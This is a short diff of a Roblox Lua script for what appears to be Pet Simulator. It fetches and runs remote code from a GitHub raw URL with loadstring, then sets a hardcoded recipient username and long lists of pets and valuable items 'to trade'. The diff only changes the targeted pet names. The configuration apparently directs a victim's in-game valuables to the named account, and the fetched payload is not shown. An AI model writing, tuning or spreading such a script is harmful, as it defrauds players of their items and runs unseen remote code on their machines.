@@ -3,7 +3,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-9
 wait(25)
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
-    getgenv().PetToTrade = {"Wireframe Cat", "Wireframe Dog"}
+    getgenv().PetToTrade = {"Prison Axolotl", "Prison Cow"}
     getgenv().PaternToTrade = {0,1,2}
     getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token"}
 
